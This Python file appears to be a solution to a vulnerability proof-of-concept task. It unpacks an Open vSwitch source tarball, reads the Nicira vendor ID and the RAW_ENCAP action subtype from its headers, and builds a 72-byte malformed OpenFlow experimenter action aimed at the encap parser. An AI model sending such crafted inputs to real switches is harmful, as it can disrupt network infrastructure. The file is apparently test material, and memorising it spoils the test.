import os
import re
import tarfile
import tempfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_tarball(src, dst):
            try:
                with tarfile.open(src, 'r:*') as tf:
                    tf.extractall(dst)
            except tarfile.ReadError:
                # Not a tarball; maybe it's a directory
                pass

        def read_text_file(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
            except Exception:
                return ""

        def walk_files(root):
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    yield os.path.join(dirpath, fn)

        def parse_define(text, name_candidates):
            for name in name_candidates:
                # Look for exact #define NAME VALUE
                m = re.search(r'^\s*#\s*define\s+' + re.escape(name) + r'\s+([0-9xXa-fA-F]+)\b', text, re.MULTILINE)
                if m:
                    val = m.group(1)
                    try:
                        if val.lower().startswith('0x'):
                            return int(val, 16)
                        return int(val, 10)
                    except Exception:
                        continue
            return None

        def safe_eval_int(expr, mapping):
            # Remove comments
            expr = re.sub(r'/\*.*?\*/', '', expr, flags=re.S)
            expr = re.sub(r'//.*?$', '', expr, flags=re.M)
            # Allow only numbers, operators, parentheses, hex, names (to be replaced)
            tokens = re.findall(r'[A-Za-z_][A-Za-z0-9_]*|0x[0-9A-Fa-f]+|\d+|<<|>>|[|&^~()+\-*/%]', expr)
            if not tokens:
                return None
            rebuilt = []
            for t in tokens:
                if re.match(r'0x[0-9A-Fa-f]+$', t) or re.match(r'^\d+$', t) or re.match(r'<<|>>|[|&^~()+\-*/%]', t):
                    rebuilt.append(t)
                else:
                    # name: replace if known
                    if t in mapping:
                        rebuilt.append(str(mapping[t]))
                    else:
                        # unknown names treated as 0 to keep monotonicity
                        rebuilt.append('0')
            safe_expr = ' '.join(rebuilt)
            try:
                return int(eval(safe_expr, {"__builtins__": {}}, {}))  # nosec - controlled tokens
            except Exception:
                return None

        def parse_enum(text, enum_name):
            # Find enum block
            m = re.search(r'enum\s+' + re.escape(enum_name) + r'\s*{(.*?)}\s*;', text, re.S)
            if not m:
                return {}
            block = m.group(1)
            # Remove comments
            block = re.sub(r'/\*.*?\*/', '', block, flags=re.S)
            block = re.sub(r'//.*?$', '', block, flags=re.M)
            # Split by commas
            entries = [e.strip() for e in block.split(',')]
            values = {}
            current = -1
            for entry in entries:
                if not entry:
                    continue
                # Handle possible trailing attributes like = ... __attribute__((...))
                # Keep only before possible __attribute__ or = part
                # But we need the name and optional value
                # Pattern: NAME = EXPR or NAME
                parts = entry.split('=')
                name = parts[0].strip()
                # Remove possible annotations after name
                name = re.split(r'\s+', name)[0]
                if not re.match(r'^[A-Za-z_][A-Za-z0-9_]*$', name):
                    continue
                if len(parts) == 1:
                    current += 1
                    values[name] = current
                else:
                    expr = '='.join(parts[1:]).strip()
                    val = safe_eval_int(expr, values)
                    if val is None:
                        # fallback: try simple int parse
                        expr_num = re.match(r'^\s*(0x[0-9A-Fa-f]+|\d+)', expr)
                        if expr_num:
                            v = expr_num.group(1)
                            if v.lower().startswith('0x'):
                                val = int(v, 16)
                            else:
                                val = int(v, 10)
                        else:
                            # last resort, set to current+1
                            val = current + 1
                    current = val
                    values[name] = current
            return values

        def find_nx_vendor_id(rootdir):
            # Try to find NX_VENDOR_ID or NICIRA_OUI
            candidates = ['NX_VENDOR_ID', 'NX_VENDOR_ID_NICIRA', 'NICIRA_VENDOR_ID', 'NICIRA_OUI', 'NX_NICIRA_VENDOR_ID']
            for fp in walk_files(rootdir):
                if not fp.endswith(('.h', '.hh', '.hpp', '.c', '.cc', '.cpp')):
                    continue
                text = read_text_file(fp)
                val = parse_define(text, candidates)
                if val is not None:
                    return val
            # Default known Nicira OUI
            return 0x00002320

        def find_nxast_raw_encap(rootdir):
            enum_names = ['nx_action_subtype', 'nx_action_subtype_next', 'nx_action_subtype_v2']
            for fp in walk_files(rootdir):
                if not fp.endswith(('.h', '.hh', '.hpp', '.c', '.cc', '.cpp')):
                    continue
                text = read_text_file(fp)
                for en in enum_names:
                    vals = parse_enum(text, en)
                    if 'NXAST_RAW_ENCAP' in vals:
                        return vals['NXAST_RAW_ENCAP']
                # Also try direct #define
                m = re.search(r'#\s*define\s+NXAST_RAW_ENCAP\s+([0-9xXa-fA-F]+)', text)
                if m:
                    s = m.group(1)
                    try:
                        if s.lower().startswith('0x'):
                            return int(s, 16)
                        return int(s, 10)
                    except Exception:
                        pass
            # Fallback guess (commonly around 38-60 range in OVS versions)
            return 38

        # Extract source
        tmpdir = tempfile.mkdtemp(prefix="src-")
        extract_tarball(src_path, tmpdir)

        nx_vendor = find_nx_vendor_id(tmpdir)
        nx_raw_encap = find_nxast_raw_encap(tmpdir)

        # Build 72-byte OpenFlow experimenter (vendor) action with NX subtype RAW_ENCAP
        total_len = 72
        header_len = 16  # ofp_action_experimenter(8) + nx header extra (subtype + pad(6))
        body_len = total_len - header_len

        # type = 0xffff (experimenter/vendor)
        ofpat_experimenter = 0xFFFF
        # Pack header
        data = bytearray()
        data += struct.pack('>H', ofpat_experimenter)
        data += struct.pack('>H', total_len)
        data += struct.pack('>I', nx_vendor)
        data += struct.pack('>H', nx_raw_encap & 0xFFFF)
        data += b'\x00' * 6  # pad

        # Body: craft placeholder content that resembles a minimal RAW_ENCAP payload
        # Attempt to include a plausible small header followed by a property-like blob
        # We'll set a simple 4-byte "proto" followed by a series of dummy bytes.
        # Even if the exact layout differs, valid length fields should keep parser engaged.
        body = bytearray()

        # Heuristic fields:
        # - 2 bytes: 'flags' or 'hdr size' (set small nonzero)
        # - 2 bytes: 'pkt_type' or 'ethertype' (use 0x0800 for IPv4 as a common ethtype)
        # - 4 bytes: 'prop_len' (length of following properties region) or padding
        # - Remaining bytes: dummy "properties" content
        if body_len >= 8:
            body += struct.pack('>H', 0x0001)  # flags/hdrsize
            body += struct.pack('>H', 0x0800)  # ethertype IPv4
            prop_region_len = body_len - 8
            body += struct.pack('>I', prop_region_len if prop_region_len > 0 else 0)
            # Fill property-like entries
            # Try to create at least one property header: class(2) type(1) len(1) + value...
            remaining = body_len - 8
            # Property header
            if remaining >= 4:
                # class 0xffff (experimenter), type 0x01, len min 4 (header only)
                body += struct.pack('>H', 0xFFFF)
                body += b'\x01\x04'
                remaining -= 4
                # value: fill zeros up to remaining
                if remaining > 0:
                    body += b'\x00' * remaining
            else:
                body += b'\x00' * remaining
        else:
            body += b'\x00' * body_len

        # Truncate or pad body to exact body_len
        if len(body) < body_len:
            body += b'\x00' * (body_len - len(body))
        elif len(body) > body_len:
            body = body[:body_len]

        data += body

        # Ensure exact 72 bytes
        if len(data) != total_len:
            if len(data) < total_len:
                data += b'\x00' * (total_len - len(data))
            else:
                data = data[:total_len]

        return bytes(data)
